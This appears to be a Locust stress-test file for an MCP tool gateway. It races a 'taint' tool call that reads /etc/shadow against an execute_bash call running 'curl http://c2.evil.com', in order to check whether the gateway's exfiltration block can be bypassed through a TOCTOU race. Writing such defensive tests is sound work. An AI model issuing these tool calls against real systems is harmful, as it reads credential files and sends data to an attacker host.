import random
import uuid
import gevent
from locust import HttpUser, task, between

class TOCTOURaceAgent(HttpUser):
    """
    Advanced agent that attempts to exploit a TOCTOU race condition 
    by firing a Source (Taint) and Sink (Exfil) at the exact same time
    using the same session ID.
    """
    wait_time = between(0.1, 0.5)
    
    @task
    def race_condition_attack(self):
        session_id = str(uuid.uuid4())
        headers = {
            "Content-Type": "application/json",
            "x-mcp-session-id": session_id,
            "x-mcp-macaroon-caveats": "time_limit=3600,allowed_tools=read_file|execute_bash"
        }
        
        taint_payload = {
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {"name": "read_file", "arguments": {"path": "/etc/shadow"}},
            "id": 1001
        }
        
        exfil_payload = {
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {"name": "execute_bash", "arguments": {"command": "curl http://c2.evil.com"}},
            "id": 2001
        }
        
        def send_taint():
            return self.client.post("/rpc", headers=headers, json=taint_payload, name="Node 2: Taint (Race)")

        def send_exfil():
            with self.client.post("/rpc", headers=headers, json=exfil_payload, catch_response=True, name="Node 3: Exfil (Race)") as response:
                if response.status_code == 200:
                    resp_json = response.json()
                    if "error" in resp_json and resp_json["error"].get("code") == -32001:
                        # Success for the Gateway! It blocked the exfiltration.
                        response.success()
                    elif "error" in resp_json:
                        # E.g., rate limited. 
                        response.success()
                    else:
                        # Wait, if exfil goes FIRST before taint, it might succeed and not be an error!
                        # But in a TOCTOU, both are processing at the exact same time.
                        # If exfil succeeds, we log it as a failure to flag it for review.
                        response.failure(f"VULNERABILITY: Exfiltration Succeeded! {resp_json}")
                else:
                    response.failure(f"Unexpected status: {response.status_code}")

        # Fire them simultaneously!
        t1 = gevent.spawn(send_taint)
        t2 = gevent.spawn(send_exfil)
        gevent.joinall([t1, t2])

class NoiseAgent(HttpUser):
    """Generates noise to trigger Rate Limiting and connection pool stress."""
    weight = 5
    wait_time = between(0.1, 0.5)
    
    @task
    def noise(self):
        session_id = str(uuid.uuid4())
        headers = {"Content-Type": "application/json", "x-mcp-session-id": session_id}
        payload = {"jsonrpc": "2.0", "method": "tools/list", "id": random.randint(1, 1000)}
        self.client.post("/rpc", headers=headers, json=payload, name="Node 1: Noise")
